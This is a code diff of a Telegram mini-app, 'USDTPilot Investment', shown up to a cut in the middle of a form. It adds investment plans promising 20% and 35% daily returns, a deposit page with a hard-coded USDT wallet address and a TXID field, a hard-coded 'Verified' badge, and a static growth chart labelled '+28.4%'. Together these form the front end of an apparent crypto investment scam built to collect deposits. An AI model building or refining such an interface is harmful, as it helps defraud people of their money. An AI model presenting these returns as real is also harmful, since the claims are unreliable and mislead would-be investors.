@@ -2,395 +2,925 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDTPilot Investment WebApp</title>
-    <!-- Telegram WebApp SDK -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>USDTPilot Investment</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         :root {
-            --bg-color: #0f172a;
-            --card-bg: #1e293b;
-            --accent-color: #38bdf8;
-            --text-main: #f8fafc;
-            --text-muted: #94a3b8;
-            --success: #22c55e;
-            --danger: #ef4444;
+            --bg-dark: #090d16;
+            --card-bg: rgba(21, 28, 44, 0.75);
+            --card-border: rgba(255, 255, 255, 0.08);
+            --accent-cyan: #00d2ff;
+            --accent-blue: #0072ff;
+            --primary-gradient: linear-gradient(135deg, #00d2ff 0%, #0072ff 100%);
+            --success-gradient: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            --vip-gradient: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);
+            --text-white: #ffffff;
+            --text-sub: #94a3b8;
+            --danger-color: #ef4444;
+            --warning-color: #f59e0b;
         }
 
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--bg-dark); color: var(--text-white); padding-bottom: 90px; overflow-x: hidden; }
+        .app { max-width: 480px; margin: 0 auto; padding: 16px; }
 
-        .container {
-            padding: 20px;
-            max-width: 500px;
-            margin: 0 auto;
-            width: 100%;
-            box-sizing: border-box;
-            flex: 1;
-        }
+        /* Splash Screen */
+        #splash { position: fixed; inset: 0; background: var(--bg-dark); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; transition: opacity 0.5s ease, visibility 0.5s; }
+        #splash img { width: 80px; height: 80px; filter: drop-shadow(0 0 15px rgba(0, 210, 255, 0.4)); }
+        #splash h2 { font-size: 24px; font-weight: 800; background: var(--primary-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        #splash p { font-size: 12px; color: var(--text-sub); letter-spacing: 1px; }
+        .loader { width: 32px; height: 32px; border: 3px solid rgba(255, 255, 255, 0.1); border-top-color: var(--accent-cyan); border-radius: 50%; animation: spin 0.8s linear infinite; margin-top: 15px; }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
+        /* Header */
+        header { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; background: var(--card-bg); border-radius: 16px; border: 1px solid var(--card-border); backdrop-filter: blur(10px); margin-bottom: 18px; }
+        .profile { display: flex; align-items: center; gap: 12px; }
+        .avatar { width: 42px; height: 42px; border-radius: 50%; background: var(--primary-gradient); display: flex; align-items: center; justify-content: center; font-size: 18px; color: #fff; box-shadow: 0 4px 12px rgba(0, 210, 255, 0.3); overflow: hidden; }
+        .avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .profile h3 { font-size: 15px; font-weight: 700; }
+        .profile small { font-size: 11px; color: var(--text-sub); }
+        .verified { font-size: 10px; font-weight: 600; color: #10b981; background: rgba(16, 185, 129, 0.12); padding: 6px 12px; border-radius: 20px; border: 1px solid rgba(16, 185, 129, 0.25); display: flex; align-items: center; gap: 5px; }
 
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
+        /* Balance Card */
+        .balance-card { background: linear-gradient(145deg, rgba(16, 24, 40, 0.9) 0%, rgba(10, 15, 28, 0.95) 100%); border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 24px; padding: 24px 20px; text-align: center; box-shadow: 0 12px 30px rgba(0,0,0,0.4); margin-bottom: 20px; position: relative; overflow: hidden; }
+        .balance-card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(0, 210, 255, 0.08) 0%, transparent 60%); pointer-events: none; }
+        .balance-card p { font-size: 12px; color: var(--text-sub); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
+        .balance-card h1 { font-size: 40px; font-weight: 800; letter-spacing: -1px; margin: 4px 0; }
+        .balance-card span.badge-usdt { font-size: 11px; font-weight: 700; color: var(--accent-cyan); background: rgba(0, 210, 255, 0.15); padding: 3px 8px; border-radius: 6px; letter-spacing: 0.5px; display: inline-flex; align-items: center; gap: 5px; }
+        .badge-usdt img { width: 14px; height: 14px; }
 
-        .user-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background-color: var(--accent-color);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            color: #000;
-        }
+        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; padding-top: 16px; border-top: 1px solid rgba(255, 255, 255, 0.08); }
+        .stats div { text-align: center; }
+        .stats i { font-size: 14px; color: var(--accent-cyan); margin-bottom: 4px; }
+        .stats h4 { font-size: 11px; color: var(--text-sub); font-weight: 500; }
+        .stats b { font-size: 15px; color: #fff; font-weight: 700; display: block; margin-top: 2px; }
 
-        .balance-card {
-            background: linear-gradient(135deg, #1e293b, #334155);
-            border-radius: 16px;
-            padding: 24px;
-            text-align: center;
-            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
-            margin-bottom: 24px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
+        /* Quick Buttons */
+        .quick { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 22px; }
+        .quick button { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 16px; padding: 14px; font-size: 14px; font-weight: 600; color: #fff; display: flex; align-items: center; justify-content: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; backdrop-filter: blur(10px); }
+        .quick button i { font-size: 16px; color: var(--accent-cyan); }
+        .quick button:active { transform: scale(0.96); opacity: 0.9; }
 
-        .balance-title {
-            color: var(--text-muted);
-            font-size: 14px;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .balance-amount {
-            font-size: 36px;
-            font-weight: 800;
-            color: var(--accent-color);
-        }
-
-        .action-buttons {
-            display: flex;
-            gap: 12px;
-            margin-top: 20px;
-        }
-
-        .btn {
-            flex: 1;
-            padding: 12px 16px;
-            border: none;
-            border-radius: 10px;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .btn-deposit { background-color: var(--success); color: #fff; }
-        .btn-withdraw { background-color: var(--danger); color: #fff; }
-        .btn-primary { background-color: var(--accent-color); color: #0f172a; width: 100%; margin-top: 15px; }
-
-        .btn:active { transform: scale(0.97); }
-
-        .form-group {
-            margin-bottom: 16px;
-            text-align: left;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 6px;
-            color: var(--text-muted);
-            font-size: 14px;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 12px;
-            background-color: #0f172a;
-            border: 1px solid #334155;
-            border-radius: 8px;
-            color: #fff;
-            box-sizing: border-box;
-            font-size: 14px;
-        }
-
-        .form-control:focus {
-            outline: none;
-            border-color: var(--accent-color);
-        }
-
+        /* Pages & Dynamic Views */
         .page { display: none; }
-        .page.active { display: block; }
+        .page.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
 
-        .nav-bar {
-            position: sticky;
-            bottom: 0;
-            background-color: var(--card-bg);
-            display: flex;
-            justify-content: space-around;
-            padding: 12px 0;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-        }
+        .section-header { font-size: 15px; font-weight: 800; margin: 20px 0 12px 0; display: flex; align-items: center; gap: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .section-header.standard { color: var(--accent-cyan); }
+        .section-header.vip { color: #f59e0b; }
 
-        .nav-item {
-            color: var(--text-muted);
-            text-decoration: none;
-            font-size: 12px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 4px;
-            cursor: pointer;
-        }
+        /* Plans Grid */
+        .plans-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
+        .plan-card { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 18px; padding: 16px; text-align: center; position: relative; backdrop-filter: blur(10px); transition: transform 0.2s; }
+        .plan-card:active { transform: scale(0.98); }
+        .plan-card.vip-card { border-color: rgba(245, 158, 11, 0.3); background: linear-gradient(145deg, rgba(30, 25, 15, 0.8) 0%, rgba(21, 28, 44, 0.8) 100%); }
+        .plan-badge { position: absolute; top: 10px; right: 10px; font-size: 9px; font-weight: 800; padding: 2px 6px; border-radius: 6px; text-transform: uppercase; }
+        .badge-std { background: rgba(0, 210, 255, 0.15); color: var(--accent-cyan); }
+        .badge-vip { background: rgba(245, 158, 11, 0.2); color: #f59e0b; }
+        .plan-title { font-size: 22px; font-weight: 800; margin: 8px 0 4px 0; }
+        .plan-rate { font-size: 13px; font-weight: 700; color: #10b981; margin-bottom: 10px; }
+        .plan-info { font-size: 11px; color: var(--text-sub); display: flex; flex-direction: column; gap: 4px; margin-bottom: 14px; text-align: left; background: rgba(0,0,0,0.2); padding: 8px; border-radius: 8px; }
+        .plan-btn { width: 100%; padding: 10px; border-radius: 10px; border: none; font-size: 12px; font-weight: 700; cursor: pointer; color: #fff; }
+        .btn-std { background: var(--primary-gradient); box-shadow: 0 4px 10px rgba(0, 210, 255, 0.2); }
+        .btn-vip { background: var(--vip-gradient); box-shadow: 0 4px 10px rgba(245, 158, 11, 0.2); }
 
-        .nav-item.active { color: var(--accent-color); }
+        /* Forms */
+        label { display: block; font-size: 11px; color: var(--text-sub); text-transform: uppercase; margin-bottom: 6px; letter-spacing: 0.5px; }
+        select, input, textarea { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid var(--card-border); background: rgba(9, 13, 22, 0.7); color: #fff; font-size: 14px; outline: none; margin-bottom: 14px; transition: border-color 0.2s; }
+        select:focus, input:focus, textarea:focus { border-color: var(--accent-cyan); }
+        
+        .network-preview-card { background: rgba(15, 23, 42, 0.8); border: 1px solid var(--card-border); border-radius: 16px; padding: 16px; margin-bottom: 16px; display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+        .net-left { display: flex; align-items: center; gap: 12px; }
+        .net-left img { width: 36px; height: 36px; border-radius: 50%; box-shadow: 0 0 10px rgba(0,210,255,0.2); }
+        .net-info h4 { font-size: 14px; font-weight: 700; color: #fff; }
+        .net-info p { font-size: 11px; color: var(--accent-cyan); font-weight: 600; margin-top: 2px; }
 
-        .toast {
-            position: fixed;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background-color: #334155;
-            color: #fff;
-            padding: 12px 24px;
-            border-radius: 30px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
-            display: none;
-            z-index: 1000;
-            font-size: 14px;
-        }
+        .wallet-box { background: rgba(9, 13, 22, 0.85); border: 1px solid var(--card-border); border-radius: 14px; padding: 14px; margin-bottom: 14px; }
+        .wallet-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
+        .copy-btn { background: rgba(0, 210, 255, 0.15); border: 1px solid rgba(0, 210, 255, 0.3); color: var(--accent-cyan); padding: 6px 12px; border-radius: 8px; font-size: 11px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 5px; }
+        .copy-btn:active { transform: scale(0.95); }
+        .address-text { font-family: monospace; font-size: 12px; color: #fff; word-break: break-all; background: rgba(255,255,255,0.03); padding: 10px; border-radius: 8px; border: 1px dashed rgba(255,255,255,0.1); }
+
+        button.primary { width: 100%; padding: 14px; border-radius: 12px; border: none; background: var(--primary-gradient); color: #fff; font-size: 14px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3); transition: transform 0.2s; }
+        button.success { width: 100%; padding: 14px; border-radius: 12px; border: none; background: var(--success-gradient); color: #fff; font-size: 14px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); transition: transform 0.2s; }
+
+        /* History Elements */
+        .history-tabs { display: flex; gap: 8px; margin-bottom: 16px; overflow-x: auto; padding-bottom: 4px; }
+        .tab-btn { background: rgba(255,255,255,0.05); border: 1px solid var(--card-border); color: var(--text-sub); padding: 8px 14px; border-radius: 20px; font-size: 11px; font-weight: 600; cursor: pointer; white-space: nowrap; transition: all 0.2s; }
+        .tab-btn.active { background: var(--primary-gradient); color: #fff; border-color: transparent; }
+
+        .tx-card { background: rgba(9, 13, 22, 0.7); border: 1px solid var(--card-border); border-radius: 14px; padding: 14px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; }
+        .tx-icon { width: 38px; height: 38px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 16px; }
+        .tx-icon.deposit { background: rgba(16, 185, 129, 0.15); color: #10b981; }
+        .tx-icon.withdraw { background: rgba(239, 68, 68, 0.15); color: #ef4444; }
+        .tx-icon.invest { background: rgba(0, 210, 255, 0.15); color: var(--accent-cyan); }
+        .tx-details { flex: 1; margin-left: 12px; }
+        .tx-details h5 { font-size: 13px; font-weight: 700; color: #fff; }
+        .tx-details p { font-size: 10px; color: var(--text-sub); margin-top: 2px; }
+        .tx-amount { text-align: right; }
+        .tx-amount h5 { font-size: 14px; font-weight: 800; }
+        .status-badge { font-size: 9px; font-weight: 700; padding: 2px 6px; border-radius: 4px; text-transform: uppercase; display: inline-block; margin-top: 3px; }
+        .status-completed { background: rgba(16, 185, 129, 0.15); color: #10b981; }
+        .status-pending { background: rgba(245, 158, 11, 0.15); color: #f59e0b; }
+
+        /* Stats */
+        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px; }
+        .stat-box { background: rgba(15, 23, 42, 0.7); border: 1px solid var(--card-border); border-radius: 16px; padding: 14px; text-align: center; }
+        .stat-box i { font-size: 18px; color: var(--accent-cyan); margin-bottom: 6px; }
+        .stat-box h3 { font-size: 18px; font-weight: 800; color: #fff; margin: 2px 0; }
+        .stat-box p { font-size: 11px; color: var(--text-sub); }
+
+        .progress-container { background: rgba(9, 13, 22, 0.8); border: 1px solid var(--card-border); border-radius: 16px; padding: 16px; margin-bottom: 16px; }
+        .progress-bar-bg { width: 100%; height: 8px; background: rgba(255,255,255,0.08); border-radius: 10px; overflow: hidden; margin-top: 10px; }
+        .progress-bar-fill { height: 100%; background: var(--primary-gradient); width: 0%; transition: width 0.5s ease; }
+
+        .chart-visual { height: 120px; display: flex; align-items: flex-end; justify-content: space-between; gap: 8px; padding-top: 20px; border-bottom: 1px solid var(--card-border); }
+        .chart-bar { flex: 1; background: rgba(0, 210, 255, 0.2); border-radius: 6px 6px 0 0; transition: height 0.5s; }
+        .chart-bar.active { background: var(--primary-gradient); }
+
+        /* Support */
+        .support-card { background: rgba(15, 23, 42, 0.7); border: 1px solid var(--card-border); border-radius: 16px; padding: 16px; margin-bottom: 12px; display: flex; align-items: center; justify-content: space-between; gap: 12px; text-decoration: none; color: #fff; }
+        .support-icon { width: 44px; height: 44px; border-radius: 12px; background: rgba(0, 210, 255, 0.1); display: flex; align-items: center; justify-content: center; font-size: 20px; color: var(--accent-cyan); }
+
+        /* Navigation */
+        nav { position: fixed; bottom: 0; left: 0; right: 0; height: 70px; background: rgba(15, 22, 36, 0.92); backdrop-filter: blur(15px); border-top: 1px solid var(--card-border); display: flex; justify-content: space-around; align-items: center; max-width: 480px; margin: 0 auto; z-index: 100; border-radius: 20px 20px 0 0; }
+        nav button { background: none; border: none; color: var(--text-sub); font-size: 10px; font-weight: 500; display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; flex: 1; transition: color 0.2s; }
+        nav button i { font-size: 18px; }
+        nav button.active { color: var(--accent-cyan); font-weight: 700; }
+
+        /* Toast Popup */
+        #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1e293b; color: #fff; border: 1px solid var(--card-border); padding: 12px 20px; border-radius: 12px; font-size: 13px; font-weight: 500; z-index: 10000; display: none; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
     </style>
 </head>
+
 <body>
 
-    <div id="toast" class="toast">Notice message here</div>
+<!-- Splash Screen -->
+<div id="splash">
+    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDTPilot">
+    <h2>USDTPilot</h2>
+    <p>SECURE INVESTMENT PLATFORM</p>
+    <div class="loader"></div>
+</div>
 
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <div class="user-info">
-                <div class="user-avatar" id="u-avatar">U</div>
+<div class="app">
+
+<!-- Header -->
+<header>
+    <div class="profile">
+        <div class="avatar" id="header-avatar">
+            <i class="fa-solid fa-user"></i>
+        </div>
+        <div>
+            <h3 id="username">User</h3>
+            <small id="userid">ID: 000000</small>
+        </div>
+    </div>
+    <div class="verified">
+        <i class="fa-solid fa-circle-check"></i> Verified
+    </div>
+</header>
+
+<!-- Balance Section -->
+<section class="balance-card">
+    <p>Available Balance</p>
+    <h1>$<span id="balance">100.00</span></h1>
+    <span class="badge-usdt">
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT"> USDT
+    </span>
+
+    <div class="stats">
+        <div>
+            <i class="fa-solid fa-chart-line"></i>
+            <h4>Total Profit</h4>
+            <b>$<span id="profit">0.00</span></b>
+        </div>
+        <div>
+            <i class="fa-solid fa-lock"></i>
+            <h4>Active Investment</h4>
+            <b>$<span id="active">0.00</span></b>
+        </div>
+    </div>
+</section>
+
+<!-- Quick Actions -->
+<div class="quick">
+    <button onclick="openPage('deposit')">
+        <i class="fa-solid fa-wallet"></i> Deposit
+    </button>
+    <button onclick="openPage('withdraw')">
+        <i class="fa-solid fa-arrow-up"></i> Withdraw
+    </button>
+</div>
+
+<!-- Home / Plans Page -->
+<section id="invest" class="page active">
+    <div class="section-header standard">
+        <i class="fa-solid fa-bolt"></i> Standard Plans (20% Daily)
+    </div>
+    <div id="standard-plans" class="plans-grid"></div>
+
+    <div class="section-header vip">
+        <i class="fa-solid fa-crown"></i> VIP Plans (35% Daily)
+    </div>
+    <div id="vip-plans" class="plans-grid"></div>
+</section>
+
+<!-- Deposit Page -->
+<section id="deposit" class="page">
+    <div class="card" style="background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px;">
+        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 16px;"><i class="fa-solid fa-arrow-down" style="color: #10b981;"></i> Deposit USDT</h3>
+        
+        <label>Select Deposit Network</label>
+        <select id="deposit-network" onchange="updateDepositAddress()">
+            <option value="TRC20">TRON Network (USDT-TRC20)</option>
+            <option value="BEP20">BNB Smart Chain (USDT-BEP20)</option>
+            <option value="ERC20">Ethereum Network (USDT-ERC20)</option>
+            <option value="TON">TON Network (USDT-TON)</option>
+        </select>
+
+        <div class="network-preview-card">
+            <div class="net-left">
+                <img id="deposit-net-icon" src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="Crypto Icon">
+                <div class="net-info">
+                    <h4 id="deposit-net-fullname">Tron TRC20</h4>
+                    <p id="deposit-net-tag">Tether USD (TRC20)</p>
+                </div>
+            </div>
+            <span style="font-size: 10px; background: rgba(16,185,129,0.15); color: #10b981; padding: 4px 8px; border-radius: 6px; font-weight: 700;">Fast Deposit</span>
+        </div>
+
+        <div class="wallet-box">
+            <div class="wallet-header">
+                <span style="font-size: 11px; color: var(--text-sub); text-transform: uppercase;">Official Deposit Wallet</span>
+                <button class="copy-btn" onclick="copyAddress()"><i class="fa-regular fa-copy"></i> Copy Address</button>
+            </div>
+            <div class="address-text" id="deposit-address-display">TLPVBmQnS6VTV7MwzLzYy7EjUKqsKob7hs</div>
+        </div>
+
+        <label>Amount USDT</label>
+        <input type="number" id="deposit-amount" placeholder="Min $10">
+
+        <label>Transaction Hash / TXID</label>
+        <input type="text" id="deposit-txid" placeholder="Paste TXID Hash Here">
+
+        <button class="primary" onclick="submitDeposit()">Submit Deposit</button>
+    </div>
+</section>
+
+<!-- Withdrawal Page -->
+<section id="withdraw" class="page">
+    <div class="card" style="background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px;">
+        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 16px;"><i class="fa-solid fa-paper-plane" style="color: var(--danger-color);"></i> Withdraw USDT</h3>
+        
+        <label>Select Withdrawal Network</label>
+        <select id="withdraw-network" onchange="updateWithdrawIcon()">
+            <option value="TRC20">TRON Network (USDT-TRC20)</option>
+            <option value="BEP20">BNB Smart Chain (USDT-BEP20)</option>
+            <option value="ERC20">Ethereum Network (USDT-ERC20)</option>
+            <option value="TON">TON Network (USDT-TON)</option>
+        </select>
+
+        <div class="network-preview-card">
+            <div class="net-left">
+                <img id="withdraw-net-icon" src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="Crypto Icon">
+                <div class="net-info">
+                    <h4 id="withdraw-net-fullname">Tron TRC20</h4>
+                    <p id="withdraw-net-tag">USDT TRC20 Address</p>
+                </div>
+            </div>
+            <span style="font-size: 10px; background: rgba(0,210,255,0.15); color: var(--accent-cyan); padding: 4px 8px; border-radius: 6px; font-weight: 700;">Instant Payout</span>
+        </div>
+
+        <label>Destination Address</label>
+        <input type="text" id="withdraw-address" placeholder="Enter Wallet Address">
+
+        <label>Amount USDT</label>
+        <input type="number" id="withdraw-amount" placeholder="Min $10">
+
+        <button class="success" onclick="submitWithdraw()">Submit Withdrawal</button>
+    </div>
+</section>
+
+<!-- Real Professional History Page -->
+<section id="history" class="page">
+    <div class="card" style="background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px;">
+        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 14px;"><i class="fa-solid fa-clock-rotate-left" style="color: var(--accent-cyan);"></i> Transaction History</h3>
+        
+        <!-- Filter Tabs -->
+        <div class="history-tabs">
+            <button class="tab-btn active" onclick="filterHistory('all', this)">All Activity</button>
+            <button class="tab-btn" onclick="filterHistory('deposit', this)">Deposits</button>
+            <button class="tab-btn" onclick="filterHistory('withdraw', this)">Withdrawals</button>
+            <button class="tab-btn" onclick="filterHistory('invest', this)">Investments</button>
+        </div>
+
+        <!-- Dynamic History Container -->
+        <div id="history-container"></div>
+    </div>
+</section>
+
+<!-- Stats Page -->
+<section id="stats-page" class="page">
+    <div class="card" style="background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px;">
+        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 16px;"><i class="fa-solid fa-chart-pie" style="color: #f59e0b;"></i> Performance Analytics</h3>
+
+        <div class="progress-container">
+            <div style="display: flex; justify-content: space-between; font-size: 12px;">
+                <span style="color: var(--text-sub);">Investment Portfolio Goal</span>
+                <b id="goal-percent" style="color: var(--accent-cyan);">0%</b>
+            </div>
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill" id="goal-bar"></div>
+            </div>
+        </div>
+
+        <div class="stat-grid">
+            <div class="stat-box">
+                <i class="fa-solid fa-wallet"></i>
+                <h3 id="stat-deposits">$0.00</h3>
+                <p>Total Deposited</p>
+            </div>
+            <div class="stat-box">
+                <i class="fa-solid fa-money-bill-transfer"></i>
+                <h3 id="stat-withdraws">$0.00</h3>
+                <p>Total Withdrawn</p>
+            </div>
+            <div class="stat-box">
+                <i class="fa-solid fa-receipt"></i>
+                <h3 id="stat-count">0</h3>
+                <p>Total Operations</p>
+            </div>
+            <div class="stat-box">
+                <i class="fa-solid fa-percent"></i>
+                <h3 id="stat-roi">0%</h3>
+                <p>Avg Growth Rate</p>
+            </div>
+        </div>
+
+        <div style="background: rgba(9, 13, 22, 0.8); border: 1px solid var(--card-border); border-radius: 16px; padding: 16px;">
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-size: 12px; font-weight: 700; color: #fff;">Weekly Growth Trend</span>
+                <small style="font-size: 10px; color: #10b981;"><i class="fa-solid fa-arrow-trend-up"></i> +28.4%</small>
+            </div>
+            <div class="chart-visual">
+                <div class="chart-bar" style="height: 30%;"></div>
+                <div class="chart-bar" style="height: 45%;"></div>
+                <div class="chart-bar" style="height: 60%;"></div>
+                <div class="chart-bar" style="height: 50%;"></div>
+                <div class="chart-bar" style="height: 75%;"></div>
+                <div class="chart-bar active" style="height: 90%;"></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Support Page -->
+<section id="support" class="page">
+    <div class="card" style="background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px;">
+        <div style="text-align: center; margin-bottom: 20px;">
+            <div style="width: 60px; height: 60px; border-radius: 50%; background: rgba(0, 210, 255, 0.15); display: flex; align-items: center; justify-content: center; margin: 0 auto 10px auto; font-size: 26px; color: var(--accent-cyan); border: 1px solid rgba(0, 210, 255, 0.3);">
+                <i class="fa-solid fa-headset"></i>
+            </div>
+            <h3 style="font-size: 18px; font-weight: 800;">24/7 Live Support</h3>
+            <p style="font-size: 12px; color: var(--text-sub); margin-top: 4px;">Have questions or need assistance? Contact us!</p>
+        </div>
+
+        <a href="https://t.me/USDTPilotAdmin" target="_blank" class="support-card">
+            <div style="display: flex; align-items: center; gap: 12px;">
+                <div class="support-icon"><i class="fa-brands fa-telegram"></i></div>
                 <div>
-                    <div style="font-weight: bold;" id="u-name">User</div>
-                    <div style="font-size: 12px; color: var(--text-muted);" id="u-handle">@username</div>
+                    <h4 style="font-size: 14px; font-weight: 700;">Telegram Official Support</h4>
+                    <p style="font-size: 11px; color: #10b981;">Online • Fast Response</p>
                 </div>
+            </div>
+            <i class="fa-solid fa-chevron-right" style="color: var(--text-sub); font-size: 12px;"></i>
+        </a>
+
+        <div style="background: rgba(9, 13, 22, 0.7); border: 1px solid var(--card-border); border-radius: 16px; padding: 16px; margin-top: 15px;">
+            <h4 style="font-size: 13px; font-weight: 700; margin-bottom: 12px; color: var(--accent-cyan);"><i class="fa-solid fa-paper-plane"></i> Send Direct Ticket</h4>
+            
+            <label>Subject</label>
+            <input type="text" id="support-subject" placeholder="Deposit / Withdrawal issue">
+
+            <label>Message Detail</label>
+            <textarea id="support-msg" rows="3" placeholder="Describe your issue or txid..." style="resize: none;"></textarea>
+
+            <button class="primary" onclick="sendTicket()"><i class="fa-solid fa-paper-plane"></i> Submit Ticket</button>
+        </div>
+    </div>
+</section>
+
+<!-- Profile Page -->
+<section id="profile" class="page">
+    <div class="card" style="background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 20px; padding: 20px;">
+        <div style="display: flex; align-items: center; gap: 14px; margin-bottom: 20px; border-bottom: 1px solid var(--card-border); padding-bottom: 16px;">
+            <div id="profile-page-avatar" style="width: 55px; height: 55px; border-radius: 50%; background: var(--primary-gradient); display: flex; align-items: center; justify-content: center; font-size: 22px; color: #fff; overflow: hidden; box-shadow: 0 4px 15px rgba(0, 210, 255, 0.3);">
+                <i class="fa-solid fa-user"></i>
+            </div>
+            <div>
+                <h3 id="profile-fullname" style="font-size: 18px; font-weight: 800;">Loading...</h3>
+                <small id="profile-username" style="color: var(--accent-cyan); font-weight: 600;">@username</small>
             </div>
         </div>
 
-        <!-- HOME PAGE -->
-        <div id="page-home" class="page active">
-            <div class="balance-card">
-                <div class="balance-title">Available Balance</div>
-                <div class="balance-amount" id="balance-display">$0.00 USDT</div>
-                <div class="action-buttons">
-                    <button class="btn btn-deposit" onclick="openPage('deposit')">Deposit</button>
-                    <button class="btn btn-withdraw" onclick="openPage('withdraw')">Withdraw</button>
-                </div>
+        <div style="display: flex; flex-direction: column; gap: 12px; font-size: 13px;">
+            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--card-border); padding-bottom: 10px;">
+                <span style="color: var(--text-sub);"><i class="fa-solid fa-id-badge" style="width: 20px; color: var(--accent-cyan);"></i> Telegram ID:</span> 
+                <b id="profile-id">000000</b>
+            </div>
+            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--card-border); padding-bottom: 10px;">
+                <span style="color: var(--text-sub);"><i class="fa-solid fa-globe" style="width: 20px; color: var(--accent-cyan);"></i> Language:</span> 
+                <b id="profile-lang">EN</b>
+            </div>
+            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--card-border); padding-bottom: 10px;">
+                <span style="color: var(--text-sub);"><i class="fa-solid fa-shield-halved" style="width: 20px; color: #10b981;"></i> Security Level:</span> 
+                <b style="color:#10b981;">Telegram Verified</b>
+            </div>
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span style="color: var(--text-sub);"><i class="fa-solid fa-calendar-days" style="width: 20px; color: var(--accent-cyan);"></i> Joined Date:</span> 
+                <b id="profile-date">2026</b>
             </div>
         </div>
 
-        <!-- DEPOSIT PAGE -->
-        <div id="page-deposit" class="page">
-            <h2>Deposit USDT</h2>
-            <div class="balance-card">
-                <div class="form-group">
-                    <label>Select Network</label>
-                    <select id="deposit-network" class="form-control">
-                        <option value="TRC20">TRON (TRC20)</option>
-                        <option value="BEP20">BNB Chain (BEP20)</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Amount (USDT)</label>
-                    <input type="number" id="deposit-amount" class="form-control" placeholder="Min $10">
-                </div>
-                <div class="form-group">
